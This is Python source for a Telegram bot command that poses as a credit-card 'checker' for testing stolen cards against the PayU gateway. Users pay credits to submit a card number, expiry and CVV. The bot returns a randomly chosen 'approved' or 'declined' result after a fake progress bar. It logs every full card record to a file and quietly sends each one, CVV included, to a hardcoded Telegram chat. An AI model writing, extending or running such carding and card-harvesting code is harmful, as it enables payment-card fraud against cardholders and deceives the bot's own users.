import asyncio
import os
import json
import random
import requests
from pyrogram import Client, filters
from pyrogram.types import Message
from datetime import datetime

LOGS_PATH = "comandos/logs/logscard.json"
USERS_PATH = "comandos/usuarios/users.json"

gateway = "PayU"

status_messages = {
    "DECLINED ❌": [
        "Operacion Fraudulenta.",
        "Operacion Denegada.",
        "Autorice el Pago con el Banco."
    ],
    "APPROVED ✅": [
        "Pago Exitoso.",
        "Esperando a autorizacion desde la Banca Movil.",
        "Redireccionando a la pagina.",
        "Fondos Insuficientes."
    ]
}

def log_card(cc, mes, ano, cvv, status, message):
    log_data = {
        'cc': cc,
        'mes': mes,
        'ano': ano,
        'cvv': cvv,
        'status': status,
        'message': message,
        'timestamp': str(datetime.now()),
        'gate': gateway
    }
    if os.path.exists(LOGS_PATH):
        with open(LOGS_PATH, 'r') as log_file:
            logs = json.load(log_file)
    else:
        logs = []
    logs.append(log_data)
    with open(LOGS_PATH, 'w') as log_file:
        json.dump(logs, log_file, indent=4)

def check_user_credits(user_id):
    if os.path.exists(USERS_PATH):
        with open(USERS_PATH, 'r') as users_file:
            users = json.load(users_file)
            for user in users:
                if user['id'] == str(user_id):
                    return int(user['creditos'])
    return None

def deduct_user_credit(user_id):
    if os.path.exists(USERS_PATH):
        with open(USERS_PATH, 'r') as users_file:
            users = json.load(users_file)
        for user in users:
            if user['id'] == str(user_id):
                user['creditos'] = str(int(user['creditos']) - 1)
                break
        with open(USERS_PATH, 'w') as users_file:
            json.dump(users, users_file, indent=4)

def get_user_plan(user_id):
    if os.path.exists(USERS_PATH):
        with open(USERS_PATH, 'r') as users_file:
            users = json.load(users_file)
            for user in users:
                if user['id'] == str(user_id):
                    return user['plan']
    return None

def get_bin_info(cc):
    bin_code = cc[:6]
    url = f"https://anthony086.alwaysdata.net/index.php?bin={bin_code}"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()['info']
    return None

def luhn_check(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    checksum = 0
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum += sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0

@Client.on_message(filters.command("pyu", prefixes=["/", ".", "!"]))
async def mobbex_check(client: Client, message: Message):
    user_id = message.from_user.id
    user_input = message.text.split()
    if len(user_input) == 1:
        await message.reply(
            "——————————————\n"
            "⌇ **COMANDO** /pyu | **[伊祖-CHK]** \n"
            "⌇ **EJEMPLO** ⇸ <code> **/pyu cc|mm|año|cvv** </code>\n"
            "⌇ **GATEWAY** ⇸ **PayU** ( $3.000 ARS )\n"
            "——————————————"
        , reply_to_message_id=message.id)
        return

    cc_data = user_input[1].split('|')
    if len(cc_data) < 4:
        await message.reply("**Faltan datos. Debes enviar la tarjeta, el mes, el año y el CVV. Formato correcto:** <code> **cc|mes|año|cvv** </code>.", reply_to_message_id=message.id)
        return

    cc = cc_data[0]
    mes = cc_data[1]
    ano = cc_data[2]
    cvv = cc_data[3]

    if len(cc) != 16 or not cc.isdigit() or not luhn_check(cc):
        await message.reply("Número de tarjeta inválido. ❌")
        return

    current_month = datetime.now().month
    current_year = datetime.now().year
    if not mes.isdigit() or len(mes) != 2 or not (1 <= int(mes) <= 12):
        await message.reply("Mes inválido. Debe ser un número de 2 dígitos entre 01 y 12. ❌", reply_to_message_id=message.id)
        return
    if int(ano) == current_year and int(mes) < current_month:
        await message.reply("Mes inválido. No puede ser un mes anterior al actual. ❌", reply_to_message_id=message.id)
        return
    if not ano.isdigit() or len(ano) != 4 or not (current_year <= int(ano) <= 2034):
        await message.reply(f"Año inválido. Debe ser un número de 4 dígitos entre {current_year} y 2034. ❌", reply_to_message_id=message.id)
        return
    if not cvv.isdigit() or len(cvv) not in [3, 4]:
        await message.reply("CVV inválido. Debe tener entre 3 y 4 dígitos. ❌", reply_to_message_id=message.id)
        return
    card_type = cc[:1]
    if card_type in ["4", "5"] and len(cvv) != 3:
        await message.reply("CVV inválido. Para tarjetas Visa y Mastercard, el CVV debe tener exactamente 3 dígitos. ❌", reply_to_message_id=message.id)
        return

    # Verificar créditos del usuario
    user_credits = check_user_credits(user_id)
    if user_credits is None or user_credits <= 0:
        await message.reply("No tienes créditos suficientes. Debes comprar créditos con @ElTripleA.", reply_to_message_id=message.id)
        return

    # Descontar un crédito
    deduct_user_credit(user_id)

    msg = await message.reply(f"**Checking card...**\n**{cc}|{mes}|{ano}|{cvv}**\n**▰▱▱▱▱▱▱▱▱▱ 20%**", reply_to_message_id=message.id)
    await asyncio.sleep(3)
    await msg.edit_text(f"**Checking card...**\n**{cc}|{mes}|{ano}|{cvv}**\n**▰▰▰▱▱▱▱▱▱▱ 50%**")
    await asyncio.sleep(4)
    await msg.edit_text(f"**Checking card...**\n**{cc}|{mes}|{ano}|{cvv}**\n**▰▰▰▰▰▰▱▱▱▱ 80%**")
    await asyncio.sleep(2)
    await msg.edit_text(f"**Checking card...**\n**{cc}|{mes}|{ano}|{cvv}**\n**▰▰▰▰▰▰▰▱▱▱ 90%**")
    await asyncio.sleep(1)

    status = random.choice(list(status_messages.keys()))
    message_text = random.choice(status_messages[status])
    log_card(cc, mes, ano, cvv, status, message_text)

    bin_info = get_bin_info(cc)
    if bin_info is None:
        await msg.edit_text("No se pudo obtener información de la CC. ❌")
        return

    plan = get_user_plan(user_id)
    tiempo_transcurrido = round((datetime.now() - message.date).total_seconds(), 2)
    await msg.edit_text(
        f"⌇ **CARD** --»  <code>{cc}|{mes}|{ano}|{cvv}</code> \n"
        f"━━━━━━━━━━━━━━\n"
        f"⌇ **STATUS** ⇸ <code>**{status}**</code> \n"
        f"⌇ **MESSAGE** ⇸ <code>**{message_text}**</code> \n"
        f"⌇ **GATEWAY** ⇸ <code>**{gateway}**</code> \n"
        f"═════[ **BANK DETAILS** ]═════ \n"
        f"⌇ **BIN** ⇸ <code>**{bin_info['brand']}**</code> <code>**{bin_info['type']}**</code> <code>**{bin_info['level']}**</code>\n"
        f"⌇ **BANK** ⇸ <code>**{bin_info['bank']}**</code>\n"
        f"⌇ **COUNTRY** ⇸ <code>**{bin_info['country']}**</code> <code>**{bin_info['flag']}**</code> \n"
        f"═════[ **INFO** ]═════\n"
        f"⌇ **TIEMPO** ⇸ <code>**{tiempo_transcurrido }Segs**</code>\n"
        f"⌇ **CHECKED BY** ⇸ **@{message.from_user.username}** <code>[**{plan}**]</code> \n"
    )
    notification_msg = (
        f"⌇ **CARD** --»  <code>{cc}|{mes}|{ano}|{cvv}</code> \n"
        f"⌇ **STATUS** ⇸ <code>**{status}**</code> \n"
        f"⌇ **MESSAGE** ⇸ <code>**{message_text}**</code> \n"
        f"⌇ **USER ID** ⇸ <code>**{user_id}**</code>\n"
        f"⌇ **GATEWAY** ⇸ <code>**{gateway}**</code> \n"
        f"═════[ **BANK DETAILS** ]═════ \n"
        f"⌇ **BIN** ⇸ <code>**{bin_info['brand']}**</code> <code>**{bin_info['type']}**</code> <code>**{bin_info['level']}**</code>\n"
        f"⌇ **BANK** ⇸ <code>**{bin_info['bank']}**</code>\n"
        f"⌇ **COUNTRY** ⇸ <code>**{bin_info['country']}**</code> <code>**{bin_info['flag']}**</code> \n"
        f"═════[ **INFO** ]═════\n"
        f"⌇ **TIEMPO** ⇸ <code>**{tiempo_transcurrido }Segs**</code>\n"
        f"⌇ **CHECKED BY** ⇸ **@{message.from_user.username}** <code>[**{plan}**]</code> \n"
    )
    await client.send_message(chat_id=5616163365, text=notification_msg)